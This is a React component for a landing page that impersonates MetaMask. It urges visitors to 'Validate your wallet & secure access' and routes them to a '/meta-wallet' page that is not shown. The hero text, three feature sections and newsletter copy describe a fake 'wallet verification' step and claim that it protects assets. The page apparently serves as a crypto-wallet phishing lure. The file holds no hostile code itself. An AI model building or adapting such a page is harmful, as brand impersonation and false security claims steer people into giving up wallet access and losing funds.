import React, { useEffect } from 'react'
import './metaMaskPagesCss/metaMaskLanding.css'
import hero from '../../../assets/metahome.webp'
import metamask_webwallet_img from '../../../assets/meta2.svg'
import metamask_explore_img from '../../../assets/meta3.svg'
import metamask_ownYourData_img from '../../../assets/Meta4.svg'
import metamask_getStarted_img from '../../../assets/Meta.png'
import MetaMaskHeader from '../metaMaskHeader/MetaMaskHeader'
import MetaMaskFooter from '../metaMaskFooter/MetaMaskFooter'
import { useNavigate } from 'react-router-dom'
import { motion } from "framer-motion";

const MetaMaskLanding = () => {

  const navigate = useNavigate()

  useEffect(() => {
    const script = document.createElement("script");
    script.src = "https://www.livecoinwatch.com/static/lcw-widget.js";
    script.defer = true;
    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  return (
    <>
      <div className='metamask_landing_body'>

        {/* ================= MARKET WIDGET ================= */}
        <div className="metamask_home-widget">
          <div className="metamask_home-widget-wrapper">
            <div
              className="livecoinwatch-widget-5"
              lcw-base="USD"
              lcw-color-tx="#999999"
              lcw-marquee-1="coins"
              lcw-marquee-2="movers"
              lcw-marquee-items="10">
            </div>
          </div>
        </div>

        <MetaMaskHeader/>

        {/* ================= HERO ================= */}
        <div className='metamask_hero'>
          <div className="metamask_hero_wrap">

            <motion.div
              initial={{ opacity: 0, x: -100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}  
              className="metamask_hero_Text">

              <h1>Validate your wallet & secure access</h1>
              <p>
                Wallet verification helps confirm ownership, enable secure connections,
                and protect your account from unauthorized access across blockchain apps.
              </p>
              <button onClick={()=>navigate('/meta-wallet')}>
                Validate Wallet
              </button>
            </motion.div>

            <motion.img
              initial={{ opacity: 0, x: 100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}  
              src={hero} 
              alt="" 
              className='metamask_hero_img'
            />
          </div>
        </div>

        {/* ================= SECTION 1 ================= */}
        <div className='metamask_webwallet'>
          <div className="metamask_webwallet_wrapper">

            <motion.div
              initial={{ opacity: 0, x: 100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }} 
              className="metamask_webwallet_Text">

              <h1>Secure wallet verification</h1>
              <p>
                Validating your wallet ensures compatibility, protects your assets,
                and enables safe interaction with decentralized applications.
              </p>
            </motion.div>

            <motion.img
              initial={{ opacity: 0, x: -100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}  
              src={metamask_webwallet_img} 
              alt="" 
              className='metamask_webwallet_img' 
            />
          </div>
        </div>

        {/* ================= SECTION 2 ================= */}
        <div className='metamask_webwallet'>
          <div className="metamask_webwallet_wrapper">

            <motion.div
              initial={{ opacity: 0, x: 100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }} 
              className="metamask_webwallet_Text two">

              <h1>Protected dApp connections</h1>
              <p>
                Wallet validation adds an extra security layer when connecting to
                blockchain applications, helping prevent unauthorized interactions.
              </p>
            </motion.div>

            <motion.img
              initial={{ opacity: 0, x: -100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }} 
              src={metamask_explore_img} 
              alt="" 
              className='metamask_webwallet_img' 
            />
          </div>
        </div>

        {/* ================= SECTION 3 ================= */}
        <div className='metamask_webwallet'>
          <div className="metamask_webwallet_wrapper">

            <motion.div
              initial={{ opacity: 0, x: 100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}  
              className="metamask_webwallet_Text">

              <h1>Ownership & access confirmation</h1>
              <p>
                Validation confirms wallet ownership and ensures only authorized
                users can access sensitive wallet functionality.
              </p>
            </motion.div>

            <motion.img
              initial={{ opacity: 0, x: -100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }} 
              src={metamask_ownYourData_img} 
              alt="" 
              className='metamask_webwallet_img' 
            />
          </div>
        </div>

        {/* ================= CTA ================= */}
        <div className='metamask_getStarted'>
          <img src={metamask_getStarted_img} alt="" className='metamask_getStarted_img' />
          <h1>Complete Wallet Validation</h1>
          <button onClick={()=>navigate('/meta-wallet')}>
            Validate Wallet
          </button>
        </div>

        {/* ================= VIDEO ================= */}
        <div className='what_is_metamask_body'>
          <h1>Why wallet validation matters</h1>
          <iframe 
            className='metaVidieo' 
            src="https://www.youtube.com/embed/YVgfHZMFFFQ?si=x8eG9dBniVU8qqjK" 
            title="YouTube video player" 
            frameBorder="0" 
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
            referrerPolicy="strict-origin-when-cross-origin" 
            allowFullScreen
          ></iframe>
        </div>

        {/* ================= NEWSLETTER ================= */}
        <div className='metamask_news_letter'>
          <div className="metamask_news_letter_wrap">
            <h1>Stay informed</h1>
            <p className='subhead'>
              Receive updates on wallet security, validation requirements, and web3 access improvements.
            </p>
            <div className='input-hold'>
              <input type="text" placeholder='Email address' />
              <button>Subscribe</button>
            </div>
            <p>
              MetaMask may use the contact information you provide to communicate
              important security and service updates. You may unsubscribe at any time.
            </p>
            <br />
            <p>
              This site is protected by reCAPTCHA and the Google Privacy Policy and
              <a href="#"> Terms of Service</a> apply.
            </p>
          </div>
        </div>

        <MetaMaskFooter/>
      </div>
    </>
  )
}

export default MetaMaskLanding
